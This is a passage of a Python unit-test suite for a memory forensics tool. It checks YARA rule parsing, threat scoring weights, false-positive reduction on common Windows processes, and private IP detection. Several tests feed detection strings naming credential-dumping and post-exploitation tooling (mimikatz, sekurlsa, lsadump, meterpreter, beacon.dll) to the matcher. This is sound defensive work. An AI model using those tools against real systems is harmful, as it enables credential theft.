    @patch('memory_forensics_tool.ttk')
    def test_process_display_blends_yara_scores(self, mock_ttk, mock_tk):
        """_update_process_display should blend YARA name-only scores."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI._update_process_display)
        self.assertIn("yara_loader", source)
        self.assertIn("yara_score", source)

    @patch('memory_forensics_tool.tk')
    @patch('memory_forensics_tool.ttk')
    def test_ensemble_weights_sum_to_0_90(self, mock_ttk, mock_tk):
        """Layer weights should sum to 0.90 (0.10 reserved for corroboration)."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI._enhanced_process_check)
        self.assertIn("0.35", source)   # Layer 1 weight
        self.assertIn("0.30", source)   # Layer 2 weight
        self.assertIn("0.25", source)   # Layer 3 weight


class TestYARAFalsePositiveReduction(unittest.TestCase):
    """Tests for false positive reduction in YARA scoring and display."""

    @classmethod
    def setUpClass(cls):
        rules_dir = os.path.join(_script_dir, 'yara_rules')
        if os.path.isdir(rules_dir):
            cls.loader = ExternalYARALoader(rules_dir)
            cls.has_rules = True
        else:
            cls.loader = None
            cls.has_rules = False

    def test_quality_weighting_reduces_single_match(self):
        """Single pattern match from multi-pattern rule should score ~25% of base."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI._score_yara_matches)
        self.assertIn("total_strings", source)
        self.assertIn("0.25", source)

    def test_quality_weighting_preserves_multi_match(self):
        """Multi-pattern matches should get full score (no reduction)."""
        # A match with match_count=3, total_strings=5 should NOT be reduced
        fake_matches = [{'severity': 'critical', 'match_count': 3, 'total_strings': 5}]
        # Directly test the scoring logic
        severity_scores = {'critical': 40, 'high': 25, 'medium': 15, 'low': 5}
        total = 0
        for match in fake_matches:
            sev = match.get('severity', 'medium').lower()
            base_score = severity_scores.get(sev, 10)
            matched_count = match.get('match_count', 1)
            total_strings = match.get('total_strings', matched_count)
            if total_strings > 2 and matched_count == 1:
                base_score = int(base_score * 0.25)
            total += base_score
        self.assertEqual(total, 40, "Multi-match critical should score full 40")

    def test_quality_weighting_reduces_single_from_multi(self):
        """Single match from 10-pattern rule should be heavily reduced."""
        fake_matches = [{'severity': 'critical', 'match_count': 1, 'total_strings': 10}]
        severity_scores = {'critical': 40, 'high': 25, 'medium': 15, 'low': 5}
        total = 0
        for match in fake_matches:
            sev = match.get('severity', 'medium').lower()
            base_score = severity_scores.get(sev, 10)
            matched_count = match.get('match_count', 1)
            total_strings = match.get('total_strings', matched_count)
            if total_strings > 2 and matched_count == 1:
                base_score = int(base_score * 0.25)
            total += base_score
        self.assertEqual(total, 10, "Single match from 10-pattern critical rule should score 10")

    def test_display_threshold_prevents_low_scores(self):
        """_update_process_display should only blend YARA score >= 20."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI._update_process_display)
        self.assertIn("yara_score >= 20", source)

    def test_minimum_pattern_length_in_index(self):
        """_build_pattern_index should skip patterns shorter than 4 chars."""
        import inspect
        source = inspect.getsource(ExternalYARALoader._build_pattern_index)
        self.assertIn("len(text_value) < 4", source)

    def test_lsass_low_yara_score(self):
        """lsass.exe should have low quality-weighted YARA score."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        matches = self.loader.match_text("lsass.exe")
        # Score with quality weighting
        severity_scores = {'critical': 40, 'high': 25, 'medium': 15, 'low': 5}
        total = 0
        for match in matches:
            sev = match.get('severity', 'medium').lower()
            base_score = severity_scores.get(sev, 10)
            matched_count = match.get('match_count', 1)
            total_strings = match.get('total_strings', matched_count)
            if total_strings > 2 and matched_count == 1:
                base_score = int(base_score * 0.25)
            total += base_score
        self.assertLess(total, 15, f"lsass.exe should score < 15 after quality weighting, got {total}")

    def test_system_low_yara_score(self):
        """System process name should have low quality-weighted YARA score."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        matches = self.loader.match_text("system")
        severity_scores = {'critical': 40, 'high': 25, 'medium': 15, 'low': 5}
        total = 0
        for match in matches:
            sev = match.get('severity', 'medium').lower()
            base_score = severity_scores.get(sev, 10)
            matched_count = match.get('match_count', 1)
            total_strings = match.get('total_strings', matched_count)
            if total_strings > 2 and matched_count == 1:
                base_score = int(base_score * 0.25)
            total += base_score
        self.assertLess(total, 15, f"'system' should score < 15 after quality weighting, got {total}")

    def test_searchindexer_low_yara_score(self):
        """SearchIndexer.exe should not produce high YARA scores."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        matches = self.loader.match_text("searchindexer.exe")
        severity_scores = {'critical': 40, 'high': 25, 'medium': 15, 'low': 5}
        total = 0
        for match in matches:
            sev = match.get('severity', 'medium').lower()
            base_score = severity_scores.get(sev, 10)
            matched_count = match.get('match_count', 1)
            total_strings = match.get('total_strings', matched_count)
            if total_strings > 2 and matched_count == 1:
                base_score = int(base_score * 0.25)
            total += base_score
        self.assertLess(total, 15, f"SearchIndexer.exe should score < 15, got {total}")

    def test_real_threat_still_scores_high(self):
        """Real malware patterns should still produce high scores."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        # Multiple mimikatz indicators = real threat
        matches = self.loader.match_text("mimikatz sekurlsa gentilkiwi kerberos lsadump wdigest")
        severity_scores = {'critical': 40, 'high': 25, 'medium': 15, 'low': 5}
        total = 0
        for match in matches:
            sev = match.get('severity', 'medium').lower()
            base_score = severity_scores.get(sev, 10)
            matched_count = match.get('match_count', 1)
            total_strings = match.get('total_strings', matched_count)
            if total_strings > 2 and matched_count == 1:
                base_score = int(base_score * 0.25)
            total += base_score
        score = min(100, total)
        self.assertGreater(score, 30, f"Real mimikatz threat should score > 30, got {score}")

    def test_total_strings_in_match_result(self):
        """Match results should include total_strings field."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        matches = self.loader.match_text("mimikatz sekurlsa gentilkiwi kerberos")
        if matches:
            self.assertIn('total_strings', matches[0])
            self.assertGreater(matches[0]['total_strings'], 0)

    def test_match_count_in_match_result(self):
        """Match results should include match_count field."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        matches = self.loader.match_text("mimikatz sekurlsa gentilkiwi kerberos")
        if matches:
            self.assertIn('match_count', matches[0])
            self.assertGreater(matches[0]['match_count'], 0)

    def test_short_patterns_excluded_from_index(self):
        """Pattern index should not contain patterns shorter than 4 chars."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        for pattern in self.loader.pattern_index.keys():
            self.assertGreaterEqual(len(pattern), 4,
                f"Pattern '{pattern}' too short (< 4 chars) in index")

    def test_common_processes_below_display_threshold(self):
        """Common Windows process names should all score below display threshold (15)."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        common_procs = [
            'svchost.exe', 'explorer.exe', 'csrss.exe', 'winlogon.exe',
            'services.exe', 'dwm.exe', 'taskmgr.exe', 'cmd.exe',
            'powershell.exe', 'conhost.exe', 'RuntimeBroker.exe',
            'chrome.exe', 'firefox.exe', 'notepad.exe', 'calc.exe',
        ]
        severity_scores = {'critical': 40, 'high': 25, 'medium': 15, 'low': 5}
        for proc_name in common_procs:
            matches = self.loader.match_text(proc_name)
            total = 0
            for match in matches:
                sev = match.get('severity', 'medium').lower()
                base_score = severity_scores.get(sev, 10)
                matched_count = match.get('match_count', 1)
                total_strings = match.get('total_strings', matched_count)
                if total_strings > 2 and matched_count == 1:
                    base_score = int(base_score * 0.25)
                total += base_score
            self.assertLess(total, 20,
                f"{proc_name} scored {total} (expected < 20 for display threshold)")


class TestYARAEdgeCases(unittest.TestCase):
    """Stress tests for YARA edge cases and boundary conditions."""

    @classmethod
    def setUpClass(cls):
        rules_dir = os.path.join(_script_dir, 'yara_rules')
        if os.path.isdir(rules_dir):
            cls.loader = ExternalYARALoader(rules_dir)
            cls.has_rules = True
        else:
            cls.loader = None
            cls.has_rules = False

    def test_very_long_text_no_crash(self):
        """Matching very long text should not crash."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        long_text = "a" * 100000
        matches = self.loader.match_text(long_text)
        self.assertIsInstance(matches, list)

    def test_special_chars_no_crash(self):
        """Text with special characters should not crash."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        special = "test\x00\x01\x02\xff\\n\\t\"'<>&;|$(){}[]!@#%^*"
        matches = self.loader.match_text(special)
        self.assertIsInstance(matches, list)

    def test_unicode_text_no_crash(self):
        """Unicode text should not crash matching."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        uni_text = "test\u00e9\u00e8\u00ea \u4e2d\u6587 \u0410\u0411\u0412"
        matches = self.loader.match_text(uni_text)
        self.assertIsInstance(matches, list)

    def test_concurrent_match_calls(self):
        """Multiple rapid match_text calls should not corrupt state."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        import threading
        results = []
        def worker(text, idx):
            m = self.loader.match_text(text)
            results.append((idx, len(m)))
        threads = []
        texts = ["mimikatz", "beacon.dll", "chrome.exe", "svchost.exe", "meterpreter"]
        for i, t in enumerate(texts):
            th = threading.Thread(target=worker, args=(t, i))
            threads.append(th)
            th.start()
        for th in threads:
            th.join(timeout=5)
        self.assertEqual(len(results), 5, "All threads should complete")

    def test_condition_with_all_binary_clauses_stripped(self):
        """Rule with only binary conditions (all stripped) should fallback correctly."""
        # Create a minimal loader to test condition evaluation
        loader = ExternalYARALoader.__new__(ExternalYARALoader)
        loader.rules_by_name = {}
        loader.pattern_index = {}
        # Test _evaluate_condition with empty condition (all stripped)
        result = loader._evaluate_condition('', {'a'}, {'a': ('test', False)})
        self.assertTrue(result, "Empty condition should match if any var matched")

    def test_condition_n_of_them(self):
        """N of them condition should require N matches."""
        loader = ExternalYARALoader.__new__(ExternalYARALoader)
        loader.rules_by_name = {}
        loader.pattern_index = {}
        # 3 of them with only 2 matched
        result = loader._evaluate_condition('3 of them', {'a', 'b'}, {'a': ('t1', False), 'b': ('t2', False), 'c': ('t3', False)})
        self.assertFalse(result, "3 of them should fail with only 2 matched")
        # 2 of them with 2 matched
        result = loader._evaluate_condition('2 of them', {'a', 'b'}, {'a': ('t1', False), 'b': ('t2', False), 'c': ('t3', False)})
        self.assertTrue(result, "2 of them should pass with 2 matched")

    def test_condition_all_of_them(self):
        """all of them condition should require all matches."""
        loader = ExternalYARALoader.__new__(ExternalYARALoader)
        loader.rules_by_name = {}
        loader.pattern_index = {}
        all_vars = {'a': ('t1', False), 'b': ('t2', False)}
        self.assertFalse(loader._evaluate_condition('all of them', {'a'}, all_vars))
        self.assertTrue(loader._evaluate_condition('all of them', {'a', 'b'}, all_vars))

    def test_condition_prefix_wildcard(self):
        """any of ($prefix*) should match variables starting with prefix."""
        loader = ExternalYARALoader.__new__(ExternalYARALoader)
        loader.rules_by_name = {}
        loader.pattern_index = {}
        all_vars = {'cmd1': ('t1', False), 'cmd2': ('t2', False), 'net1': ('t3', False)}
        result = loader._evaluate_condition('any of ($cmd*)', {'cmd1'}, all_vars)
        self.assertTrue(result)
        result = loader._evaluate_condition('any of ($net*)', {'cmd1'}, all_vars)
        self.assertFalse(result)

    def test_condition_compound_and_or(self):
        """Compound and/or conditions should evaluate correctly."""
        loader = ExternalYARALoader.__new__(ExternalYARALoader)
        loader.rules_by_name = {}
        loader.pattern_index = {}
        all_vars = {'a': ('t1', False), 'b': ('t2', False), 'c': ('t3', False)}
        # $a and $b — both matched
        result = loader._eval_compound('$a and $b', {'a', 'b'}, all_vars)
        self.assertTrue(result)
        # $a and $c — only a matched
        result = loader._eval_compound('$a and $c', {'a', 'b'}, all_vars)
        self.assertFalse(result)
        # $a or $c — a matched
        result = loader._eval_compound('$a or $c', {'a'}, all_vars)
        self.assertTrue(result)

    def test_condition_not_variable(self):
        """not $var should negate variable presence."""
        loader = ExternalYARALoader.__new__(ExternalYARALoader)
        loader.rules_by_name = {}
        loader.pattern_index = {}
        all_vars = {'a': ('t1', False), 'b': ('t2', False)}
        result = loader._eval_compound('not $a', {'a'}, all_vars)
        self.assertFalse(result)
        result = loader._eval_compound('not $a', {'b'}, all_vars)
        self.assertTrue(result)

    def test_escaped_quotes_pattern_extraction(self):
        """Patterns with escaped quotes should be correctly extracted."""
        loader = ExternalYARALoader.__new__(ExternalYARALoader)
        strings_section = '    $a = "input[type=\\"password\\"]" nocase\n'
        result = loader._extract_text_strings(strings_section)
        self.assertIn('a', result)
        text_val, is_nocase = result['a']
        self.assertEqual(text_val, 'input[type="password"]')
        self.assertTrue(is_nocase)

    def test_regex_patterns_skipped(self):
        """Regex patterns ($var = /regex/) should be skipped."""
        loader = ExternalYARALoader.__new__(ExternalYARALoader)
        strings_section = '    $a = /[a-z]+\\.exe/\n    $b = "normal text"\n'
        result = loader._extract_text_strings(strings_section)
        self.assertNotIn('a', result, "Regex pattern should be skipped")
        self.assertIn('b', result, "Normal text should be extracted")

    def test_hex_patterns_skipped(self):
        """Hex patterns ($var = { AB CD }) should be skipped."""
        loader = ExternalYARALoader.__new__(ExternalYARALoader)
        strings_section = '    $hex = { 4D 5A 90 00 }\n    $text = "normal"\n'
        result = loader._extract_text_strings(strings_section)
        self.assertNotIn('hex', result, "Hex pattern should be skipped")
        self.assertIn('text', result)

    def test_split_top_level_respects_parens(self):
        """_split_top_level should not split inside parentheses."""
        loader = ExternalYARALoader.__new__(ExternalYARALoader)
        loader.rules_by_name = {}
        loader.pattern_index = {}
        result = loader._split_top_level("(a or b) and (c or d)", " and ")
        self.assertEqual(len(result), 2)
        self.assertEqual(result[0].strip(), "(a or b)")
        self.assertEqual(result[1].strip(), "(c or d)")


class TestBug17BraceTextPatterns(unittest.TestCase):
    """Tests for BUG 17: hex skip was discarding text strings containing braces."""

    def test_text_with_braces_extracted(self):
        """Text patterns containing braces (e.g., '{GUID}') should NOT be skipped."""
        loader = ExternalYARALoader.__new__(ExternalYARALoader)
        strings_section = '    $guid = "{GUID}" ascii\n    $normal = "test" ascii\n'
        result = loader._extract_text_strings(strings_section)
        self.assertIn('guid', result, "Pattern with braces should be extracted")
        self.assertEqual(result['guid'][0], '{GUID}')
        self.assertIn('normal', result)

    def test_hex_pattern_still_skipped(self):
        """Hex patterns ($var = { AB CD }) should still be skipped."""
        loader = ExternalYARALoader.__new__(ExternalYARALoader)
        strings_section = '    $hex = { 4D 5A 90 00 }\n    $text = "normal"\n'
        result = loader._extract_text_strings(strings_section)
        self.assertNotIn('hex', result, "Hex pattern should still be skipped")
        self.assertIn('text', result)

    def test_json_brace_pattern_extracted(self):
        """JSON-like patterns with braces should be correctly extracted."""
        loader = ExternalYARALoader.__new__(ExternalYARALoader)
        strings_section = '    $json = "{\\"ver\\":" ascii\n'
        result = loader._extract_text_strings(strings_section)
        self.assertIn('json', result, "JSON pattern with braces should be extracted")
        text_val, _ = result['json']
        self.assertIn('{', text_val)


class TestBug18BackslashUnescape(unittest.TestCase):
    """Tests for BUG 18: double-backslash not unescaped in YARA patterns."""

    def test_double_backslash_unescaped(self):
        """YARA '\\\\' (escaped backslash) should be unescaped to single backslash."""
        loader = ExternalYARALoader.__new__(ExternalYARALoader)
        strings_section = '    $path = "C:\\\\Windows\\\\System32" ascii\n'
        result = loader._extract_text_strings(strings_section)
        self.assertIn('path', result)
        text_val, _ = result['path']
        self.assertEqual(text_val, 'C:\\Windows\\System32',
            f"Expected 'C:\\Windows\\System32', got '{text_val}'")

    def test_mixed_escapes(self):
        """Both backslash and quote escapes should work together."""
        loader = ExternalYARALoader.__new__(ExternalYARALoader)
        strings_section = '    $a = "C:\\\\test\\\\\\"quoted\\\\\\"" ascii\n'
        result = loader._extract_text_strings(strings_section)
        self.assertIn('a', result)
        text_val, _ = result['a']
        # C:\\test\\"quoted\\" -> C:\test\"quoted\"
        self.assertIn('C:\\test', text_val)

    def test_path_matching_after_unescape(self):
        """Unescaped path patterns should match process text with single backslashes."""
        loader = ExternalYARALoader.__new__(ExternalYARALoader)
        strings_section = '    $path = "C:\\\\Windows\\\\Temp" nocase\n'
        result = loader._extract_text_strings(strings_section)
        text_val, is_nocase = result['path']
        # After unescape, should be C:\Windows\Temp
        self.assertEqual(text_val, 'C:\\Windows\\Temp')
        # Should match in text with single backslashes
        test_text = 'C:\\Windows\\Temp\\malware.exe'
        if is_nocase:
            self.assertIn(text_val.lower(), test_text.lower())
        else:
            self.assertIn(text_val, test_text)


class TestBug19PrivateIPRange(unittest.TestCase):
    """Tests for BUG 19: 172.x private IP range check was incomplete."""

    @classmethod
    def setUpClass(cls):
        cls.engine = MemoryForensicsEngine()

    def test_172_16_is_private(self):
        """172.16.x.x should be private."""
        self.assertTrue(self.engine._is_private_ip('172.16.0.1'))
        self.assertTrue(self.engine._is_private_ip('172.16.254.254'))

    def test_172_17_to_31_is_private(self):
        """172.17.x.x through 172.31.x.x should all be private."""
        for octet in [17, 20, 24, 28, 31]:
            ip = f'172.{octet}.0.1'
            self.assertTrue(self.engine._is_private_ip(ip),
                f"172.{octet}.0.1 should be private")

    def test_172_32_is_not_private(self):
        """172.32.x.x and above should NOT be private."""
        self.assertFalse(self.engine._is_private_ip('172.32.0.1'))
        self.assertFalse(self.engine._is_private_ip('172.100.0.1'))

    def test_172_15_is_not_private(self):
        """172.15.x.x should NOT be private."""
        self.assertFalse(self.engine._is_private_ip('172.15.0.1'))

    def test_10_range_is_private(self):
        """10.x.x.x should be private."""
        self.assertTrue(self.engine._is_private_ip('10.0.0.1'))
        self.assertTrue(self.engine._is_private_ip('10.255.255.255'))

    def test_192_168_is_private(self):
        """192.168.x.x should be private."""
        self.assertTrue(self.engine._is_private_ip('192.168.1.100'))

    def test_127_is_private(self):
        """127.x.x.x (loopback) should be private."""
        self.assertTrue(self.engine._is_private_ip('127.0.0.1'))

    def test_public_ip_is_not_private(self):
        """Public IPs should not be private."""
        self.assertFalse(self.engine._is_private_ip('8.8.8.8'))
        self.assertFalse(self.engine._is_private_ip('185.220.101.42'))

    def test_timeline_uses_private_ip_check(self):
        """Timeline should use _is_private_ip for IP suspicion logic."""
        import inspect
        source = inspect.getsource(MemoryForensicsEngine.build_timeline)
        self.assertIn('_is_private_ip', source)

    def test_malformed_ip_no_crash(self):
        """Malformed IPs should not crash _is_private_ip."""
        self.assertFalse(self.engine._is_private_ip('172.'))
        self.assertFalse(self.engine._is_private_ip('not.an.ip'))
        self.assertFalse(self.engine._is_private_ip(''))


class TestBug20LambdaClosure(unittest.TestCase):
    """Tests for BUG 20: lambda closure race condition in monitor loop."""

    @patch('memory_forensics_tool.tk')
    @patch('memory_forensics_tool.ttk')
    def test_lambda_captures_by_value(self, mock_ttk, mock_tk):
        """Monitor loop lambdas should capture variables by value (default args)."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI._realtime_monitor_loop)
        # Should use default argument capture, not bare closure
        self.assertIn('lambda cp=current_processes', source)
        self.assertIn('lambda cc=current_connections', source)


class TestDefensiveInit(unittest.TestCase):
    """Tests for defensive initialization of monitoring counters."""

    @patch('memory_forensics_tool.tk')
    @patch('memory_forensics_tool.ttk')
    def test_counters_initialized_in_create_realtime_tab(self, mock_ttk, mock_tk):
        """new_process_count and suspicious_count should be initialized in create_realtime_tab."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.create_realtime_tab)
        self.assertIn('self.new_process_count', source)
        self.assertIn('self.suspicious_count', source)
        self.assertIn('self.realtime_start_time', source)


# ═══════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════

if __name__ == '__main__':
    # Print header
    print("=" * 70)
    print("   ULTRA-DEEP TEST SUITE v3.0")
    print("   Memory Forensics Analyzer — Comprehensive Testing")
    print("=" * 70)
    print()

    # Verify test dump exists
    if not os.path.exists(TEST_DUMP):
        print(f"[!] Test dump not found: {TEST_DUMP}")
        print("    Run generate_test_dump.py first!")
        sys.exit(1)

    print(f"[+] Test dump: {TEST_DUMP} ({os.path.getsize(TEST_DUMP):,} bytes)")
    print()

    # Run tests
    unittest.main(verbosity=2)
